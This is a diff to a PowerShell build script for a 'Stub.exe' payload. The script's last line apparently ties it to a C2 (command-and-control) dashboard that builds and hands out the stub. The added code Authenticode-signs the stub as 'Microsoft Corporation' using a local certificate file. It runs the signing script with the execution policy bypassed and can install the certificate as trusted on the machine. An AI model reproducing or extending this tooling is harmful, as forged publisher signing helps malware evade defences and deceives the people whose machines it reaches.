@@ -8,7 +8,9 @@
 
 param(
     [string]$CryptoPP = "",
-    [string]$MinGW    = ""
+    [string]$MinGW    = "",
+    [switch]$Sign,      # Authenticode-sign after build
+    [switch]$Install    # also trust the cert on this machine (run as Admin)
 )
 
 $StubDir = $PSScriptRoot
@@ -127,4 +129,21 @@ if ($LASTEXITCODE -ne 0) {
 Remove-Item -ErrorAction SilentlyContinue Stub_res.o
 Write-Host '[3/3] Done - Stub.exe ready.' -ForegroundColor Green
 $sz = [math]::Round((Get-Item 'Stub.exe').Length / 1024); Write-Host ('Size: ' + $sz + ' KB')
+
+# ── Authenticode signing ───────────────────────────────────────────────────────
+if ($Sign) {
+    $signScript = "$StubDir\..\sign.ps1"
+    if (Test-Path $signScript) {
+        $signArgs = @(
+            "-Files", (Resolve-Path 'Stub.exe').Path,
+            "-Subject", "Microsoft Corporation",
+            "-PfxPath", "$StubDir\..\sign.pfx"
+        )
+        if ($Install) { $signArgs += "-Install" }
+        & powershell -ExecutionPolicy Bypass -File $signScript @signArgs
+    } else {
+        Write-Host "[sign] sign.ps1 not found at $signScript" -ForegroundColor Yellow
+    }
+}
+
 Write-Host 'Next: run the C2 dashboard Builder tab to configure and download the stub.'
